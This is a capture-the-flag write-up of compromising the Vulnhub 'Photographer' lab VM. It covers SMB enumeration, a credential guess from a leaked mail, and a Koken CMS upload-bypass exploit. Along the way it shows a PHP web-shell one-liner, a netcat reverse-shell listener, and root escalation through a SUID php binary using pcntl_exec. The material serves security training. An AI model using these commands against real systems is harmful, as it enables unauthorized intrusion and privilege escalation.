---
title: Vulnhub - Photographer
description: My writeup on Photographer box.
categories:
 - vulnhub
tags: vulnhub smb koken php SUID
---

![](https://i.imgur.com/9KCQ8Re.png)

Hi all, after a long break im back again! Ready for new CTF adventures, let's begin!

You can find the machine there > [Photographer](https://www.vulnhub.com/entry/photographer-1,519/){:target="_blank"}

## Enumeration/Reconnaissance

Let's start always with nmap.

```
$ ip=192.168.1.5
$ nmap -p- --min-rate 10000 $ip
Starting Nmap 7.80 ( https://nmap.org ) at 2020-09-01 16:12 EEST
Nmap scan report for photographer.zte.com.cn (192.168.1.5)
Host is up (0.0013s latency).
Not shown: 65531 closed ports
PORT     STATE SERVICE
80/tcp   open  http
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
8000/tcp open  http-alt
MAC Address: 00:0C:29:89:92:69 (VMware)

Nmap done: 1 IP address (1 host up) scanned in 2.42 seconds
$ nmap -p 80,139,445,8000 -sC -sV -oN nmap/initial $ip
Starting Nmap 7.80 ( https://nmap.org ) at 2020-09-01 16:12 EEST
Nmap scan report for photographer.zte.com.cn (192.168.1.5)
Host is up (0.00030s latency).

PORT     STATE SERVICE     VERSION
80/tcp   open  http        Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Photographer by v1n1v131r4
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
8000/tcp open  http        Apache httpd 2.4.18 ((Ubuntu))
|_http-open-proxy: Proxy might be redirecting requests
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Koken API error
|_http-trane-info: Problem with XML parsing of /evox/about
MAC Address: 00:0C:29:89:92:69 (VMware)
Service Info: Host: PHOTOGRAPHER
```

Port 80 doesnt give much, so let's enumerate SMB. Let's list the shares first.

```
$ smbmap -H $ip
[+] Guest session   	IP: 192.168.1.5:445	Name: photographer.zte.com.cn                           
        Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	print$                                            	NO ACCESS	Printer Drivers
	sambashare                                        	READ ONLY	Samba on Ubuntu
	IPC$                                              	NO ACCESS	IPC Service (photographer server (Samba, Ubuntu))
```

Let's dig into `sambashare` since we have `READ ONLY`.

```
$ smbclient //$ip/sambashare
Enter WORKGROUP\root's password: 
Try "help" to get a list of possible commands.
smb: > ls
  .                                   D        0  Tue Jul 21 04:30:07 2020
  ..                                  D        0  Tue Jul 21 12:44:25 2020
  mailsent.txt                        N      503  Tue Jul 21 04:29:40 2020
  wordpress.bkp.zip                   N 13930308  Tue Jul 21 04:22:23 2020

		278627392 blocks of size 1024. 264268400 blocks available
smb: > get mailsent.txt 
getting file \mailsent.txt of size 503 as mailsent.txt (122.8 KiloBytes/sec) (average 122.8 KiloBytes/sec)
smb: > get wordpress.bkp.zip 
getting file \wordpress.bkp.zip of size 13930308 as wordpress.bkp.zip (85023.8 KiloBytes/sec) (average 82953.1 KiloBytes/sec)
smb: > exit
```

`mailsent.txt` provide us 2 mails & a message:

```
agi@photographer.com
daisa@photographer.com

Hi Daisa!
Your site is ready now.
Don't forget your secret, my babygirl ;)
```

About `wordpress.bkp.zip` seems useless.

Let's enumerate now port `8000` in the end we can see this: "Built with Koken" Let's search for possible exploits on koken.

This one seems good [exploit](https://www.exploit-db.com/exploits/48706){:target="_blank"}

## Koken exploitation - shell as www-data

I searched for the admin panel location it's under `/admin` and we can login as `daisa@photographer.com:babygirl`

![](https://i.imgur.com/vZtUKv7.png)

Now simply we can follow the PoC, i used a php reverse shell instead of this `<?php system($_GET['cmd']);?>`

I renamed it:

```
$ mv shell.php shell.php.jpg
```

Now let's upload it and capture the request with burp & change the shell.php.jpg to shell.php:

![](https://i.imgur.com/ybn6Oje.png)

We have shell!

```
$ nc -lvp 6666
listening on [any] 6666 ...
$ python3 -c 'import pty; pty.spawn("/bin/bash")'
www-data@photographer:/$ ^Z
[1]+  Stopped                 nc -lvp 6666
$ stty raw -echo

www-data@photographer:/$ 
```

## www-data -> root

Now privesc to root is simple, let's search for SUID files.

```
www-data@photographer:/$ find / -uid 0 -perm -4000 -type f 2>/dev/null
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/eject/dmcrypt-get-device
/usr/lib/xorg/Xorg.wrap
/usr/lib/snapd/snap-confine
/usr/lib/openssh/ssh-keysign
/usr/lib/x86_64-linux-gnu/oxide-qt/chrome-sandbox
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/sbin/pppd
/usr/bin/pkexec
/usr/bin/passwd
/usr/bin/newgrp
/usr/bin/gpasswd
/usr/bin/php7.2 <---
```

We can run php as root perfect.

```
www-data@photographer:/$ /usr/bin/php7.2 -r "pcntl_exec('/bin/sh', ['-p']);"
# whoami;id
root
uid=33(www-data) gid=33(www-data) euid=0(root) groups=33(www-data)
```

Cool box! :D

